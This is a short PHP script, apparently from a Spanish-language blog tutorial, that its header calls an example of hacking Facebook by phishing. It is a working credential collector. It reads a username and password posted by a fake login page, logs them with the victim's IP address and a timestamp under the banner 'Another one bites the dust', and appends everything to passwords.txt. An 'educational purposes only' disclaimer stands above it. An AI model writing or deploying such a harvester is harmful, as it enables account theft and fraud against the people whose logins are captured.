<?php
/**
 * Ejemplo de hackeo de Facebook con Phishing
 * @author parzibyte
 * Más tutoriales en: parzibyte.me/blog

 * NOTA: el autor no se hace cargo de los daños que esto pueda
 * ocasionar, solo se hace con fines educativos :)
 */
# Configurar fecha y hora
# https://parzibyte.me/blog/2019/06/17/configurar-zona-horaria-php/
date_default_timezone_set("America/Mexico_City");
$fechaYHora = date("Y-m-d H:i:s");
# Obtener la IP
# https://parzibyte.me/blog/2019/06/06/obtener-ip-usuario-php/
$ip = isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : "";

# Decodificar carga útil
# https://parzibyte.me/blog/2018/12/26/codificar-decodificar-json-php/
$cargaUtil = json_decode(file_get_contents("php://input"));
$usuario = $cargaUtil->usuario;
$password = $cargaUtil->password;
# Armar mensaje
$mensaje = "==========================" . PHP_EOL;
$mensaje .= "Another one bites the dust" . PHP_EOL;
$mensaje .= "==========================" . PHP_EOL;
$mensaje .= "Fecha y hora: $fechaYHora" . PHP_EOL;
$mensaje .= "IP: $ip" . PHP_EOL;
$mensaje .= "Usuario: '$usuario'" . PHP_EOL;
$mensaje .= "Contraseña: '$password'" . PHP_EOL;
$mensaje .= PHP_EOL;
# Y escribirlo
# Nota: podrías usar una base de datos: https://parzibyte.me/blog/tag/pdo/
file_put_contents("passwords.txt", $mensaje, FILE_APPEND);
?>